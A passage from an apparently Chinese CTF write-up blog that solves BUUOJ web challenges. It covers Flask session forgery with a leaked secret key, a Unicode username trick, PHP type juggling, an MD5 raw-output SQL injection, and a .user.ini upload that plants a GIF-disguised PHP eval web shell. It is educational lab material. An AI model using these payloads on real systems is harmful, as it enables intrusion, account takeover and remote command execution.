</span></span></code></pre></td></tr></table></div></div><p>结果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#39;, &#39;csrf_token&#39;: b&#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&#39;, &#39;image&#39;: b&#39;AYHD&#39;, &#39;name&#39;: &#39;guobang&#39;, &#39;user_id&#39;: &#39;10&#39;}
</span></span></code></pre></td></tr></table></div></div><p>然后我们需要吧<code>name</code>的值修改为<code>admin</code>。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：<a href=https://github.com/noraj/flask-session-cookie-manager target=_blank rel="noopener noreffer">flask-session-cookie-manager</a></p><blockquote><p>这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号<code>""</code>括起来</p><p>python flask_session_cookie_manager{2,3}.py {encode,decode}</p><p>-s &ldquo;SECRET_KEY&rdquo; 都需要使用
-c &ldquo;Session cookie value&rdquo; session的值 只有解密decode用得到
-t &ldquo;Session cookie structure&rdquo; cookie结构 只有encode用得</p></blockquote><p>执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python flask_session_cookie_manager3.py encode -s &#34;ckj123&#34; -t &#34;{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#39;, &#39;csrf_token&#39;: b&#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&#39;, &#39;image&#39;: b&#39;AYHD&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}&#34;
</span></span></code></pre></td></tr></table></div></div><p>得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg
</span></span></code></pre></td></tr></table></div></div><p>放在请求头中，格式为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cookie: session=加密内容
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png></p><h2 id=解法二unicode欺骗 class=headerLink><a href=#%e8%a7%a3%e6%b3%95%e4%ba%8cunicode%e6%ac%ba%e9%aa%97 class=header-mark></a>解法二：Unicode欺骗</h2><p>第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为</p><blockquote><p>ᴬᴰᴹᴵᴺ&mdash;&mdash;注册后&mdash;&mdash;>ADMIN&mdash;修改密码&mdash;>admin</p></blockquote><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ᴬᴰᴹᴵᴺ
</span></span></code></pre></td></tr></table></div></div><p>注册以后使用<code>ᴬᴰᴹᴵᴺ</code>登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。</p><hr><h1 id=极客大挑战-2019buyflag class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019buyflag class=header-mark></a>[极客大挑战 2019]BuyFlag</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png>网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示</p><blockquote><p>Only Cuit&rsquo;s students can buy the FLAG</p></blockquote><p>应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;!--
</span></span><span class=line><span class=cl>	~~~post money and password~~~
</span></span><span class=line><span class=cl>if (isset($_POST[&#39;password&#39;])) {
</span></span><span class=line><span class=cl>	$password = $_POST[&#39;password&#39;];
</span></span><span class=line><span class=cl>	if (is_numeric($password)) {
</span></span><span class=line><span class=cl>		echo &#34;password can&#39;t be number&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>	}elseif ($password == 404) {
</span></span><span class=line><span class=cl>		echo &#34;Password Right!&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>还记得php<code>==</code>关系运算会强制转换类型，用POST传一个password=404a，<code>404a</code>会被强制转换为<code>404</code>，密码就对上了。接下来是钱的问题，flag需要<strong>100000000</strong>块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，<code>10e10</code>，就是10的10次方，通过。最终的请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /pay.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
</span></span><span class=line><span class=cl>Content-Length: 25
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span class=line><span class=cl>Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Cookie: user=1
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>password=404a&amp;money=10e10
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=suctf-2019checkin class=headerLink><a href=#suctf-2019checkin class=header-mark></a>[SUCTF 2019]CheckIn</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png></p><p>知识点</p><blockquote><p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.</p></blockquote><p>准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>auto_prepend_file=233.gif
</span></span></code></pre></td></tr></table></div></div><p>接下来上传图片马，尝试了正常上传PHP马会提示：</p><blockquote></blockquote><p>所以使用script马执行php：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;script language=&#34;php&#34;&gt;eval($_REQUEST[shell])&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>上传成功后会提示文件路径：</p><blockquote><p>Your dir uploads/852aff287f54bca0ed7757a702913e50
Your files :
array(5) { [0]=> string(1) &ldquo;.&rdquo; [1]=> string(2) &ldquo;..&rdquo; [2]=> string(9) &ldquo;.user.ini&rdquo; [3]=> string(7) &ldquo;233.gif&rdquo; [4]=> string(9) &ldquo;index.php&rdquo; }</p></blockquote><p>这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(&lsquo;cat /flag&rsquo;)。</p><hr><h1 id=bjdctf2020easy-md5 class=headerLink><a href=#bjdctf2020easy-md5 class=header-mark></a>[BJDCTF2020]Easy MD5</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png></p><p>参考：</p><blockquote><p><a href=https://www.jianshu.com/p/12125291f50d target=_blank rel="noopener noreffer">【Jarvis OJ】Login&ndash;password=&rsquo;".md5($pass,true)."</a></p><p><a href=https://blog.csdn.net/March97/article/details/81222922 target=_blank rel="noopener noreffer">sql注入：md5($password,true)</a></p><p><a href=http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/ target=_blank rel="noopener noreffer">Leet More 2010 Oh Those Admins! writeup</a></p></blockquote><p>随便输入一些东西都没有反应，在请求头中发现了一个Hint：</p><blockquote><p>select * from &lsquo;admin&rsquo; where password=md5($pass,true)</p></blockquote><p><strong>语法</strong></p><p><strong>md5(string,raw)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。要计算的字符串。</td></tr><tr><td>raw</td><td>可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td></tr></tbody></table><p>概括理解，这里如果raw参数为<code>true</code>的话，这个函数的返回值是<code>string</code>的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是<code>ffifdyop</code>，我们来对它进行一波操作</p><ul><li><p>源字符串：ffifdyop</p></li><li><p>md5加密值：276f722736c95d99e921722cf9ed621c</p></li><li><p>hex解码：&lsquo;or'6É].é!r,ùíb.</p></li></ul><p>最后那几个应该是不可见字符，重要的是前面一段：<code>'or'6</code>，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个<code>'</code>单引号。执行以后真正的sql语句为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6É].é!r,ùíb.‘
</span></span></code></pre></td></tr></table></div></div><p>可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：</p><blockquote><p>a string starting with a <code>1</code> is cast as an integer when used as a boolean.</p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。</p></blockquote><p>自己进行的测试：</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png></p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png></p><p>所以真正的解法是只要sql语句的格式为password=&lsquo;xxxxxxxx&rsquo; or &lsquo;1xxxx&rsquo;，即hex包含字符串"276f722731"（&lsquo;or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。</p><p>下面这个程序是这道题开头参考列表中的第三个链接。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>for ($i = 0;;) { 
</span></span><span class=line><span class=cl> for ($c = 0; $c &lt; 1000000; $c++, $i++)
</span></span><span class=line><span class=cl>  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)
</span></span><span class=line><span class=cl>   echo &#34;\nmd5($i) = &#34; . md5($i, true) . &#34;\n&#34;;
</span></span><span class=line><span class=cl> echo &#34;.&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>这个程序遍历数字进行md5加密，使用stripos匹配是否有<code>'or'</code>，这个函数有一个弊病就是如果是以<code>'or'</code>开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由<code>\'or\'</code>改为<code>'or'([1-9]+|0+[1-9])</code> 不过我的方法自己还没跑出来🤣，回头加个多线程试一试</p><p>（更新）</p><p>自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> 找到了md5(2413633098): 
</span></span><span class=line><span class=cl> 找到了md5(5207660362): 
</span></span><span class=line><span class=cl> 找到了md5(8351555222): 
</span></span><span class=line><span class=cl> 找到了md5(13095770027): 
</span></span><span class=line><span class=cl> 找到了md5(14860117901): 
</span></span><span class=line><span class=cl> 找到了md5(15724086109): 
</span></span><span class=line><span class=cl> 找到了md5(16529176061): 
</span></span><span class=line><span class=cl> 找到了md5(17428338265): 
</span></span><span class=line><span class=cl> 找到了md5(18717303578):
</span></span><span class=line><span class=cl> 找到了md5(19342380396): 
</span></span><span class=line><span class=cl> 找到了md5(23960028257): 
</span></span><span class=line><span class=cl> 找到了md5(32561902614): 
</span></span><span class=line><span class=cl> 找到了md5(38983153698): 
</span></span><span class=line><span class=cl> 找到了md5(39742292223): 
</span></span><span class=line><span class=cl> 找到了md5(44120894060): 
</span></span><span class=line><span class=cl> 找到了md5(44820604888): 
</span></span><span class=line><span class=cl> 找到了md5(45570673322): 
</span></span><span class=line><span class=cl> 找到了md5(45855250502): 
</span></span><span class=line><span class=cl> 找到了md5(53660569009): 
</span></span><span class=line><span class=cl> 找到了md5(55098175010): 
</span></span><span class=line><span class=cl> 找到了md5(59763304323): 
</span></span><span class=line><span class=cl> 找到了md5(60185044906): 
</span></span><span class=line><span class=cl> 找到了md5(68625783421): 
</span></span><span class=line><span class=cl> 找到了md5(70949326264): 
</span></span><span class=line><span class=cl> (md5值删了，因为乱码会影响博客的搜索功能)
</span></span></code></pre></td></tr></table></div></div><p>程序源码如下（自己写着玩，轻喷）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># codeing = utf-8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import threading
</span></span><span class=line><span class=cl>import hashlib
</span></span><span class=line><span class=cl>import re
</span></span><span class=line><span class=cl>import itertools
</span></span><span class=line><span class=cl>import time
</span></span><span class=line><span class=cl># r&#39;\&#39;or\&#39;([1-9]+|0+[1-9])&#39;
</span></span><span class=line><span class=cl># r&#39;\&#39;or\&#39;&#39;
</span></span><span class=line><span class=cl>pattern=re.compile(r&#39;\&#39;or\&#39;([1-9]+|0+[1-9])&#39;,re.I)
</span></span><span class=line><span class=cl>item = itertools.count(1)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def thrfunc():
</span></span><span class=line><span class=cl>    while 1:
</span></span><span class=line><span class=cl>        s2 = &#39;&#39;
</span></span><span class=line><span class=cl>        temp = str(next(item))
</span></span><span class=line><span class=cl>        s1 = hashlib.md5(temp.encode(encoding=&#39;UTF-8&#39;)).hexdigest()
</span></span><span class=line><span class=cl>        for i in range(0, len(s1), 2):
</span></span><span class=line><span class=cl>            s2 = s2 + chr(int(s1[i:i + 2], 16))
</span></span><span class=line><span class=cl>        if re.search(pattern, s2):
</span></span><span class=line><span class=cl>            print(&#34;找到了md5(&#34; + temp + &#34;): &#34; + s2)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>threads=[]
</span></span><span class=line><span class=cl>for i in range(10):
</span></span><span class=line><span class=cl>    t = threading.Thread(target=thrfunc)
</span></span><span class=line><span class=cl>    threads.append(t)
</span></span><span class=line><span class=cl>    t.start()
</span></span></code></pre></td></tr></table></div></div><p>虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。</p><p>还有一个能用的md5值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>content: 129581926211651571912466741651878684928
</span></span><span class=line><span class=cl>hex: 06da5430449f8f6f23dfc1276f722738
</span></span><span class=line><span class=cl>raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8
</span></span><span class=line><span class=cl>string: T0Do#&#39;or&#39;8
</span></span></code></pre></td></tr></table></div></div><p>以上是第一层。<strong>其实看了源码里只验证了字符串是否等于<code>ffifdyop</code>我写的脚本里的值肯定通过不了</strong></p><p>第二层可以直接在源码中看到注释。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$a = $GET[&#39;a&#39;];
</span></span><span class=line><span class=cl>$b = $_GET[&#39;b&#39;];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($a != $b &amp;&amp; md5($a) == md5($b)){
</span></span><span class=line><span class=cl>    // wow, glzjin wants a girl friend.
</span></span></code></pre></td></tr></table></div></div><p>简单的md5以0E开头</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=QNKCDZO&amp;b=240610708
</span></span></code></pre></td></tr></table></div></div><p>第三层</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>include &#34;flag.php&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>highlight_file(__FILE__);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
</span></span><span class=line><span class=cl>    echo $flag;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>这一有一些不同的是md5比较使用了<code>===</code>不仅比较类型还比较值。但是md5有一个：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>md5([1,2,3]) == md5([4,5,6]) == NULL
</span></span></code></pre></td></tr></table></div></div><p>所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>param1[]=1&amp;param2[]=2
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=zjctf-2019nizhuansiwei class=headerLink><a href=#zjctf-2019nizhuansiwei class=header-mark></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php  
</span></span><span class=line><span class=cl>$text = $_GET[&#34;text&#34;];
</span></span><span class=line><span class=cl>$file = $_GET[&#34;file&#34;];
</span></span><span class=line><span class=cl>$password = $_GET[&#34;password&#34;];
</span></span><span class=line><span class=cl>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&#34;welcome to the zjctf&#34;)){
</span></span><span class=line><span class=cl>    echo &#34;&lt;br&gt;&lt;h1&gt;&#34;.file_get_contents($text,&#39;r&#39;).&#34;&lt;/h1&gt;&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>    if(preg_match(&#34;/flag/&#34;,$file)){
</span></span><span class=line><span class=cl>        echo &#34;Not now!&#34;;
</span></span><span class=line><span class=cl>        exit(); 
</span></span><span class=line><span class=cl>    }else{
</span></span><span class=line><span class=cl>        include($file);  //useless.php
</span></span><span class=line><span class=cl>        $password = unserialize($password);
</span></span><span class=line><span class=cl>        echo $password;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>else{
